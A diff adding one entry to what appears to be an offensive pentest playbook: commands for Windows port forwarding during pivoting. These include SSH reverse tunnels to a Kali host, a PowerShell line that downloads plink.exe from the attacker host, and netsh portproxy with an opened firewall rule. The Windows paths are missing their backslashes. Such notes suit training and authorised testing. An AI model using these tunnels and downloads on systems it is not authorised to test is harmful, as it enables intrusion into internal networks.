@@ -1,0 +1,22 @@
+{
+  "id": "win_portfwd",
+  "phase": "PIVOT",
+  "title": "Windows Port Forwarding",
+  "body": "Three methods depending on what's available: ssh.exe (modern Windows), Plink (older/OpenSSH removed), Netsh (native, needs admin). Each has tradeoffs.",
+  "cmd": "# ── CHECK WHAT'S AVAILABLE ───────────────────────────\nwhere ssh         # OpenSSH client (Windows 10 1803+)\nssh.exe -V        # needs to be >= 7.6 for remote dynamic\nwhere plink       # PuTTY CLI client\n\n# ── SSH.EXE — same syntax as Linux OpenSSH ────────────\n# Remote dynamic (SOCKS proxy on Kali):\nssh -N -R 9998 kali@$lhost\n# Remote port forward (single port):\nssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@$lhost\n# Then from Kali: proxychains nmap / psql / smbclient etc\n\n# ── PLINK — when OpenSSH removed ─────────────────────\n# Download to target:\n# powershell wget -Uri http://$lhost/plink.exe -OutFile C:WindowsTempplink.exe\n# (copy plink.exe from /usr/share/windows-resources/binaries/ to apache2 root)\n\n# Remote port forward with Plink:\nC:WindowsTempplink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 $lhost\n\n# Plink in non-TTY shell (pipe y to accept host key):\ncmd.exe /c echo y | C:WindowsTempplink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 $lhost\n\n# NOTE: Plink does NOT support remote dynamic port forwarding\n# Use ssh.exe for SOCKS proxy, plink only for single-port forwards\n\n# ── NETSH — native Windows, needs admin ──────────────\n# Create port forward:\nnetsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215\n\n# Verify:\nnetsh interface portproxy show all\nnetstat -anp TCP | find \"2222\"\n\n# Open firewall hole (required or port appears filtered):\nnetsh advfirewall firewall add rule name=\"port_forward_ssh_2222\" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow\n\n# From Kali — connect through netsh forward:\nssh database_admin@192.168.50.64 -p2222\n\n# ── CLEANUP — ALWAYS DO THIS ─────────────────────────\n# Delete firewall rule:\nnetsh advfirewall firewall delete rule name=\"port_forward_ssh_2222\"\n# Delete port forward:\nnetsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64",
+  "warn": "Netsh requires admin privileges and leaves artifacts (firewall rules + portproxy entries). Always clean up. Plink exposes password on command line — risky in hostile environments. ssh.exe needs version >= 7.6 for remote dynamic.",
+  "choices": [
+    {
+      "label": "Set up SOCKS proxy on Kali",
+      "next": "ssh_tunnel"
+    },
+    {
+      "label": "Scan internal network",
+      "next": "pivot_portscan"
+    },
+    {
+      "label": "Back to pivot start",
+      "next": "pivot_start"
+    }
+  ]
+}
